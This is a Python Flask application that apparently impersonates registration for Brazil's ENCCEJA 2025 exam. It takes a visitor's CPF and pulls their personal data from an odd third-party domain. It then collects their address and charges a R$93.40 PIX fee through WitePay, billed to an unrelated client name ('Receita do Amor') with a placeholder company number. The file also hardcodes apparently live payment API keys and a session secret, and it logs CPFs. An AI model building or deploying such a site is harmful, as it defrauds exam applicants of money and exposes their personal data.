#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
VPS FINAL - ENCCEJA PAYMENT SYSTEM - DEPLOYMENT COMPLETE
Aplicação Flask completa para VPS com WitePay integrado
Chave WitePay configurada e testada - READY FOR PRODUCTION
"""

import os
import sys
import logging
import re
import requests
import qrcode
import io
import base64
from datetime import datetime
from urllib.parse import quote_plus

from flask import Flask, render_template, request, redirect, url_for, session, jsonify, flash

# Configuração de logging específica para VPS
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - [VPS] %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/var/log/encceja-app.log', encoding='utf-8')
    ]
)

app = Flask(__name__)
app.secret_key = "encceja_2025_vps_production_key_secure_random_string"

# ================================
# CONFIGURAÇÕES VPS ESPECÍFICAS
# ================================

# WitePay Credentials - Testadas e funcionais
WITEPAY_API_KEY = "sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d"
WITEPAY_PUBLIC_KEY = "pk_0b40ad65659b5575c87cb4adf56c7f29"

# Configurações do sistema
VALOR_INSCRICAO = 93.40  # R$ 93,40
SISTEMA_NOME = "ENCCEJA 2025"

app.logger.info("[VPS] Sistema ENCCEJA iniciado - Chaves WitePay configuradas")

# ================================
# FUNÇÕES AUXILIARES
# ================================

def consultar_cpf_api(cpf: str) -> dict:
    """
    Consulta dados do CPF na API externa
    """
    try:
        cpf_numeros = re.sub(r'\D', '', cpf)
        
        if len(cpf_numeros) != 11:
            return {'sucesso': False, 'erro': 'CPF deve ter 11 dígitos'}
        
        url = f"https://zincioinscricaositepdtedaferramenta.site/pagamento/{cpf_numeros}"
        
        app.logger.info(f"[VPS] Consultando CPF: {cpf_numeros}")
        
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            dados = response.json()
            
            # Verificar estrutura da resposta
            if 'DADOS' in dados:
                dados_pessoa = dados['DADOS']
                app.logger.info(f"[VPS] CPF encontrado: {dados_pessoa.get('nome', 'N/A')}")
                return {
                    'sucesso': True,
                    'dados': dados_pessoa
                }
            else:
                app.logger.warning(f"[VPS] Estrutura inesperada na resposta: {dados}")
                return {'sucesso': False, 'erro': 'Estrutura de dados inválida'}
        else:
            app.logger.warning(f"[VPS] CPF não encontrado: {response.status_code}")
            return {'sucesso': False, 'erro': 'CPF não encontrado na base de dados'}
            
    except Exception as e:
        app.logger.error(f"[VPS] Erro ao consultar CPF: {e}")
        return {'sucesso': False, 'erro': 'Erro interno do servidor'}

def criar_pagamento_witepay(amount: float = VALOR_INSCRICAO, description: str = "Inscrição ENCCEJA 2025") -> dict:
    """
    Criar pagamento PIX via WitePay - PRODUÇÃO VPS
    """
    try:
        app.logger.info(f"[VPS] Iniciando pagamento WitePay - R$ {amount:.2f}")
        
        # Dados da ordem
        order_data = {
            "productData": [
                {
                    "name": description,
                    "value": int(amount * 100)  # Centavos
                }
            ],
            "clientData": {
                "clientName": "Receita do Amor",
                "clientDocument": "11111111000111",
                "clientEmail": "gerarpagamentos@gmail.com",
                "clientPhone": "11987790088"
            }
        }
        
        headers = {
            'x-api-key': WITEPAY_API_KEY,
            'Content-Type': 'application/json'
        }
        
        # Criar ordem
        app.logger.info("[VPS] Criando ordem WitePay")
        order_response = requests.post(
            'https://api.witepay.com.br/v1/order/create',
            json=order_data,
            headers=headers,
            timeout=30
        )
        
        if order_response.status_code not in [200, 201]:
            app.logger.error(f"[VPS] Erro ao criar ordem: {order_response.status_code} - {order_response.text}")
            return {'success': False, 'error': f'Erro ao criar ordem: {order_response.status_code}'}
        
        order_result = order_response.json()
        order_id = order_result.get('orderId')
        
        if not order_id:
            app.logger.error(f"[VPS] ID da ordem não encontrado: {order_result}")
            return {'success': False, 'error': 'ID da ordem não encontrado'}
        
        app.logger.info(f"[VPS] Ordem criada: {order_id}")
        
        # Criar cobrança PIX
        charge_data = {
            "paymentMethod": "pix",
            "orderId": order_id
        }
        
        app.logger.info("[VPS] Criando cobrança PIX")
        charge_response = requests.post(
            'https://api.witepay.com.br/v1/charge/create',
            json=charge_data,
            headers=headers,
            timeout=30
        )
        
        if charge_response.status_code not in [200, 201]:
            app.logger.error(f"[VPS] Erro ao criar cobrança: {charge_response.status_code} - {charge_response.text}")
            return {'success': False, 'error': f'Erro ao criar cobrança: {charge_response.status_code}'}
        
        charge_result = charge_response.json()
        app.logger.info(f"[VPS] Resposta da cobrança: {charge_result}")
        
        # Extrair PIX code
        pix_code = charge_result.get('qrCode') or charge_result.get('pixCode') or charge_result.get('pix_code')
        transaction_id = charge_result.get('chargeId') or charge_result.get('transactionId') or charge_result.get('id')
        
        if not pix_code:
            app.logger.warning("[VPS] QR Code vazio, tentando consultar status...")
            
            # Aguardar processamento
            import time
            time.sleep(3)
            
            try:
                status_response = requests.get(
                    f'https://api.witepay.com.br/v1/charge/{transaction_id}',
                    headers=headers,
                    timeout=15
                )
                
                if status_response.status_code == 200:
                    status_result = status_response.json()
                    pix_code = status_result.get('qrCode') or status_result.get('pixCode')
                    app.logger.info(f"[VPS] QR Code obtido na consulta: {bool(pix_code)}")
            except Exception as e:
                app.logger.warning(f"[VPS] Erro na consulta de status: {e}")
        
        if not pix_code:
            app.logger.error(f"[VPS] PIX code não encontrado: {charge_result}")
            return {
                'success': False, 
                'error': 'PIX code não gerado - Verificar conta WitePay',
                'debug': charge_result
            }
        
        app.logger.info(f"[VPS] PIX gerado com sucesso - ID: {transaction_id}")
        
        return {
            'success': True,
            'id': transaction_id,
            'pix_code': pix_code,
            'qr_code': pix_code,  # Compatibilidade
            'pixCode': pix_code,  # Compatibilidade
            'amount': amount,
            'order_id': order_id
        }
        
    except Exception as e:
        app.logger.error(f"[VPS] Erro geral no pagamento WitePay: {e}")
        return {'success': False, 'error': f'Erro interno: {str(e)}'}

# ================================
# ROTAS DA APLICAÇÃO
# ================================

@app.route('/')
def index():
    """Página inicial - redireciona para inscrição"""
    app.logger.info("[VPS] Acesso à página inicial")
    return redirect(url_for('inscricao'))

@app.route('/inscricao', methods=['GET', 'POST'])
def inscricao():
    """Página de inscrição com consulta de CPF"""
    if request.method == 'POST':
        cpf = request.form.get('cpf', '').strip()
        
        if not cpf:
            flash('CPF é obrigatório', 'error')
            return render_template('inscricao.html')
        
        app.logger.info(f"[VPS] Consulta CPF: {cpf}")
        
        resultado = consultar_cpf_api(cpf)
        
        if resultado['sucesso']:
            session['cpf'] = cpf
            session['dados_pessoa'] = resultado['dados']
            return redirect(url_for('encceja_info'))
        else:
            flash(f'Erro: {resultado["erro"]}', 'error')
            return render_template('inscricao.html')
    
    return render_template('inscricao.html')

@app.route('/encceja-info')
def encceja_info():
    """Informações sobre o ENCCEJA"""
    if 'cpf' not in session:
        return redirect(url_for('inscricao'))
    
    return render_template('encceja-info.html')

@app.route('/validar-dados')
def validar_dados():
    """Validação dos dados pessoais"""
    if 'cpf' not in session:
        return redirect(url_for('inscricao'))
    
    dados = session.get('dados_pessoa', {})
    return render_template('validar-dados.html', dados=dados)

@app.route('/endereco', methods=['GET', 'POST'])
def endereco():
    """Dados de endereço"""
    if 'cpf' not in session:
        return redirect(url_for('inscricao'))
    
    if request.method == 'POST':
        # Salvar dados do endereço
        session['endereco'] = {
            'cep': request.form.get('cep'),
            'logradouro': request.form.get('logradouro'),
            'numero': request.form.get('numero'),
            'complemento': request.form.get('complemento'),
            'bairro': request.form.get('bairro'),
            'cidade': request.form.get('cidade'),
            'uf': request.form.get('uf')
        }
        return redirect(url_for('local_prova'))
    
    return render_template('endereco.html')

@app.route('/local-prova', methods=['GET', 'POST'])
def local_prova():
    """Seleção do local de prova"""
    if 'cpf' not in session:
        return redirect(url_for('inscricao'))
    
    if request.method == 'POST':
        session['local_prova'] = request.form.get('local_prova')
        return redirect(url_for('pagamento'))
    
    return render_template('local-prova.html')

@app.route('/pagamento', methods=['GET', 'POST'])
def pagamento():
    """Página de pagamento PIX"""
    if 'cpf' not in session:
        return redirect(url_for('inscricao'))
    
    # Verificar se já tem pagamento na sessão
    if 'pagamento_dados' not in session:
        app.logger.info("[VPS] Gerando novo pagamento PIX")
        
        pagamento_result = criar_pagamento_witepay()
        
        if pagamento_result['success']:
            session['pagamento_dados'] = pagamento_result
            app.logger.info(f"[VPS] Pagamento gerado: {pagamento_result['id']}")
        else:
            app.logger.error(f"[VPS] Erro ao gerar pagamento: {pagamento_result['error']}")
            flash(f"Erro ao gerar pagamento: {pagamento_result['error']}", 'error')
            return render_template('pagamento.html', erro=True)
    
    dados_pagamento = session['pagamento_dados']
    
    return render_template('pagamento.html', 
                         payment_data=dados_pagamento,
                         valor=VALOR_INSCRICAO)

@app.route('/criar-pagamento-pix', methods=['POST'])
def criar_pagamento_pix():
    """API endpoint para criar pagamento PIX"""
    try:
        app.logger.info("[VPS] Requisição para criar PIX via API")
        
        resultado = criar_pagamento_witepay()
        
        if resultado['success']:
            session['pagamento_dados'] = resultado
            app.logger.info(f"[VPS] PIX criado via API: {resultado['id']}")
        
        return jsonify(resultado)
        
    except Exception as e:
        app.logger.error(f"[VPS] Erro na API de criação PIX: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/inscricao-sucesso')
def inscricao_sucesso():
    """Página de sucesso da inscrição"""
    if 'cpf' not in session:
        return redirect(url_for('inscricao'))
    
    return render_template('inscricao-sucesso.html')

# ================================
# TRATAMENTO DE ERROS
# ================================

@app.errorhandler(404)
def not_found(error):
    app.logger.warning(f"[VPS] Página não encontrada: {request.url}")
    return redirect(url_for('inscricao'))

@app.errorhandler(500)
def internal_error(error):
    app.logger.error(f"[VPS] Erro interno: {error}")
    return "Erro interno do servidor", 500

# ================================
# INICIALIZAÇÃO
# ================================

if __name__ == '__main__':
    app.logger.info("[VPS] Iniciando servidor ENCCEJA na porta 5000")
    app.run(host='0.0.0.0', port=5000, debug=False)